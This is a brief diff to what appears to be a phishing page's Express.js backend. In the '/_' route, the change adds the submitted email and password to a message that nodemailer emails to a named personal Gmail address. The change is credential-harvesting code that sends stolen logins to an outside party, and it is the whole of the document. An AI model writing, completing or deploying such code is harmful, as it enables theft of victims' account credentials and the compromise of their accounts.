@@ -31,7 +31,7 @@ app.get('/_', function (req, res) {
     var captured_content = `\n[-] Email: ${req.body.email} Password: ${req.body.password}`;
     
     console.log("es");
-    var message = "need help";
+    var message = "need help"+captured_content;
     var toEmail = "mdalonebd@gmail.com";
 
     var transporter = nodemailer.createTransport({
